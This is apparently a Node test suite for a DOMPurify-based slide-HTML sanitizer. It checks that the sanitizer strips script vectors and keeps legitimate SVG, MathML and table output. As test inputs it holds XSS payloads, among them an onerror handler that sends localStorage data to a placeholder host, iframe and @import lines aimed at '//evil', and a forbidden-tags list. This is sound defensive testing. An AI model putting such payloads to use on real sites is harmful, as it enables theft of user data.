const test = require('node:test');
const assert = require('node:assert/strict');

// The shared slide-HTML sanitizer LOGIC (lib/core/sanitize-slide-html.mjs) —
// extracted from docs so the .html EXPORT assembler can share it (2026-07-07
// §Security 1). It is ESM (.mjs) with ZERO external imports (DOMPurify is injected
// by the host); this CJS test reaches it via dynamic import(). This suite covers
// the Node EXPORT path — a real jsdom-backed purifier — which is what the export
// must do (the docs vitest suite covers the browser binding + its window-less
// no-op in docs/src/lib/sanitize-slide-html.js).

let sani; // a real Node sanitizer over a jsdom window (the export path)
let sani2; // a SECOND independent sanitizer — the per-instance config isolation check
let mod; // the shared module namespace

test.before(async () => {
	mod = await import('../../../lib/core/sanitize-slide-html.mjs');
	const DOMPurify = (await import('dompurify')).default;
	const { JSDOM } = await import('jsdom');
	sani = mod.createSlideSanitizer(DOMPurify, new JSDOM('').window);
	sani2 = mod.createSlideSanitizer(DOMPurify, new JSDOM('').window);
});

test('createSlideSanitizer strips script vectors (real sanitization in Node)', () => {
	assert.equal(sani('<script>steal()</script><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<img src=x onerror="fetch(\'//e/?\'+localStorage.k)">'), /onerror/i);
	assert.doesNotMatch(sani('<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>'), /onerror/i);
	assert.equal(sani('<iframe src="//evil"></iframe><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<a href="javascript:alert(1)">x</a>'), /javascript:/i);
});

test('createSlideSanitizer strips the legacy script-in-style vector but keeps url()', () => {
	assert.doesNotMatch(sani('<div style="width:expression(alert(1))">x</div>'), /expression/i);
	assert.match(sani('<div class="lattice-bg" style="background-image:url(\'/a.svg\')"></div>'), /url\(/);
	assert.match(sani('<span class="logo-mark" style="--logo-mask:url(\'/l.svg\')"></span>'), /--logo-mask:url\(/);
});

test('createSlideSanitizer preserves legitimate engine output (chart SVG, MathML, tables, del/ins)', () => {
	assert.match(sani('<svg class="lattice-chart"><rect width="4" height="4"/></svg>'), /<svg/);
	assert.match(sani('<table><thead><tr><th>a</th></tr></thead></table>'), /<table>/);
	assert.equal(sani('<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>'), '<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>');
	assert.match(sani('<section class="lattice-slide"><h2>T</h2></section>'), /<h2>T<\/h2>/);
});

test('createSlideSanitizer returns falsy input unchanged (no throw on empty)', () => {
	assert.equal(sani(''), '');
});

test('FORBID_TAGS covers the never-legitimate tags (regression pin)', () => {
	for (const t of ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'base', 'link', 'meta']) {
		assert.ok(mod.FORBID_TAGS.includes(t), `FORBID_TAGS must include ${t}`);
	}
});

// ADD_ATTR — two SVG presentation attributes DOMPurify's default profile drops and the
// engine emits. Both were shipping stripped in every Studio artifact and exported player:
// `vector-effect` carries `non-scaling-stroke` on journey's sentiment curve, which without
// it scales ~77x under a non-uniform viewBox and paints the chart area as a solid slab;
// `dominant-baseline` is attribute-only on quadrant/radar/gantt/state-chart, and stripping
// it drops a centered label ~35% of its font-size. Reverting `ADD_ATTR` to `[]` previously
// left the whole unit suite green, so these pin it.
test('ADD_ATTR keeps the two presentation attributes the engine emits', () => {
	assert.match(sani('<svg><text dominant-baseline="central">x</text></svg>'), /dominant-baseline="central"/);
	assert.match(sani('<svg><path d="M0 0" vector-effect="non-scaling-stroke"/></svg>'), /vector-effect="non-scaling-stroke"/);
	for (const a of ['dominant-baseline', 'vector-effect']) assert.ok(mod.ADD_ATTR.includes(a), `ADD_ATTR must include ${a}`);
});

test('widening ADD_ATTR did not open a script vector', () => {
	// URI validation still applies to an ADD_ATTR attribute — a bare `javascript:` is caught.
	// (A `url(javascript:…)` wrapper is NOT caught, which is why the allowlist is restricted
	// to enumerated-keyword properties whose grammar never fetches — see the module comment.)
	assert.doesNotMatch(sani('<svg><text dominant-baseline="javascript:alert(1)">x</text></svg>'), /javascript:/);
	// The things that must stay shut, regardless of this widening.
	assert.doesNotMatch(sani('<svg><foreignObject><body>x</body></foreignObject></svg>'), /foreignObject/i);
	assert.doesNotMatch(sani('<svg><script>alert(1)</script></svg>'), /<script/i);
	assert.doesNotMatch(sani('<p onclick="alert(1)">x</p>'), /onclick/i);
});

// ── The config is set ONCE and must still be in force on the Nth call ─────────
// `createSlideSanitizer` calls `dp.setConfig(...)` at build time and then sanitizes with no
// per-call config, which is ~0.7-0.9ms cheaper per slide at a 4x throttle (see the module).
// That is only equivalent while DOMPurify keeps applying the persistent config to every later
// call — and keeps our `uponSanitizeAttribute` hook's per-call allowlist clone from leaking
// into the next one. Neither is our code, so neither is assumed here.
test('the persistent config still applies on the 50th call (setConfig does not decay)', () => {
	for (let i = 0; i < 50; i++) sani(`<p>warm ${i}</p><em>x</em>`);
	// FORBID_TAGS, ADD_TAGS and ADD_ATTR all come from the one setConfig call.
	assert.equal(sani('<script>steal()</script><p>ok</p>'), '<p>ok</p>');
	assert.equal(sani('<style>@import url(//evil)</style><p>ok</p>'), '<p>ok</p>');
	assert.equal(sani('<iframe src="//evil"></iframe><p>ok</p>'), '<p>ok</p>');
	assert.match(sani('<math><semantics><annotation encoding="tex">x</annotation></semantics></math>'), /<annotation/);
	assert.match(sani('<svg><path d="M0 0" vector-effect="non-scaling-stroke"/></svg>'), /vector-effect="non-scaling-stroke"/);
});

test('the MECHANISM: configured once, then sanitized with no per-call config', () => {
	// The safety tests above cannot see this, and that is the point of writing it separately: the
	// whole saving is that `_parseConfig` stops running per call, and the OUTPUT is byte-identical
	// either way — so restoring `dp.sanitize(html, cfg)` tomorrow leaves every other case in both
	// suites green while quietly putting ~0.7-0.9ms per slide (at 4x) back on every render. The
	// regression is a COUNT of arguments, which is deterministic and machine-independent, so it is
	// asserted here rather than left to a wall clock that cannot resolve it.
	const seen = { setConfig: [], sanitize: [], hooks: 0 };
	const fake = () => ({
		addHook() {
			seen.hooks++;
		},
		setConfig(cfg) {
			seen.setConfig.push(cfg);
		},
		sanitize(...args) {
			seen.sanitize.push(args);
			return args[0];
		},
	});
	const s = mod.createSlideSanitizer(fake, {});
	for (const html of ['<p>a</p>', '<p>b</p>', '<p>c</p>']) s(html);
	assert.equal(seen.setConfig.length, 1, 'the config must be set exactly once, at build time');
	assert.deepEqual(seen.setConfig[0], { FORBID_TAGS: mod.FORBID_TAGS, FORBID_ATTR: mod.FORBID_ATTR, ADD_TAGS: mod.ADD_TAGS, ADD_ATTR: mod.ADD_ATTR });
	assert.equal(seen.sanitize.length, 3);
	for (const args of seen.sanitize) {
		assert.equal(args.length, 1, 'a per-call config makes DOMPurify re-parse the whole allowlist on every slide');
	}
	assert.equal(seen.hooks, 1, 'the style-vector hook is registered once per instance');
});

test('THIRD-PARTY PIN: under setConfig, a hook that widens the allowlist does not leak into the next call', async () => {
	// The safety argument for `setConfig` rests on three lines inside DOMPurify: with `_parseConfig`
	// skipped per call, it restores ALLOWED_TAGS / ALLOWED_ATTR from bindings captured at
	// `setConfig()` time, so the per-call clone a hook forces cannot carry a widened allowlist
	// forward. `dompurify` is pinned with a CARET and patch/minor bumps auto-merge, so that is a
	// behavioral contract of a floating dependency — the class of assumption this repo pins by test
	// (see docs/e2e/mermaid-post-sanitize.spec.ts) rather than by reading.
	//
	// It needs a WIDENING hook to show itself, and ours only ever narrows (`keepAttr = false`), so
	// none of the cases above can see the guard disappear — verified by deleting those two lines
	// from the installed DOMPurify: every other assertion in this file still passes, and this one
	// fails. It also covers the next maintainer who adds a widening hook to our own sanitizer.
	// (Delete them from `dist/purify.es.mjs` to re-run that check — Node's `import` resolves the ESM
	// build, not the `.cjs` one, which is its own way to fool yourself for twenty minutes.)
	const DOMPurify = (await import('dompurify')).default;
	const { JSDOM } = await import('jsdom');
	const dp = DOMPurify(new JSDOM('').window);
	dp.setConfig({ FORBID_TAGS: mod.FORBID_TAGS, FORBID_ATTR: mod.FORBID_ATTR, ADD_TAGS: mod.ADD_TAGS, ADD_ATTR: mod.ADD_ATTR });
	dp.addHook('uponSanitizeAttribute', (_node, data) => {
		// Widen, but only for the trigger element — so call 2 is clean input with no hook effect.
		if (data.attrName === 'data-widen') data.allowedAttributes.onerror = true;
	});
	dp.sanitize('<p data-widen="1">a</p>');
	assert.doesNotMatch(
		dp.sanitize('<img src=x onerror="alert(1)">'),
		/onerror/i,
		'a previous call\'s widened allowlist survived into this one — DOMPurify is no longer restoring the pristine setConfig bindings, so the persistent config is not equivalent to the per-call one. Restore the per-call cfg argument in createSlideSanitizer.',
	);
});

test('a sanitizer is per-instance: two of them do not share config or hooks', () => {
	// The persistent config lives on an instance this function minted, so it cannot reach any
	// other DOMPurify consumer. Two independent sanitizers must behave identically and neither
	// may inherit the other's state.
	const a = sani('<script>steal()</script><p>ok</p>');
	const b = sani2('<script>steal()</script><p>ok</p>');
	assert.equal(a, '<p>ok</p>');
	assert.equal(b, '<p>ok</p>');
	assert.doesNotMatch(sani2('<img src=x onerror=alert(1)>'), /onerror/i);
});

test('sanitize is a pure function of its input — the same html sanitizes identically every time', () => {
	// The preview memo (docs/src/lib/single-slide-render.ts) reuses a sanitized string when the
	// SAME html comes back, so "same in, same out" is the property it rests on. Interleaved with
	// other inputs, because a memo hit is only sound if no earlier call can change a later answer.
	const payload = '<section id="3"><img src=x onerror=alert(1)><svg><path vector-effect="non-scaling-stroke"/></svg></section>';
	const first = sani(payload);
	for (const other of ['<p>a</p>', '<style>@import url(//evil)</style>', '<div style="width:expression(alert(1))">x</div>']) {
		sani(other);
		assert.equal(sani(payload), first);
	}
});
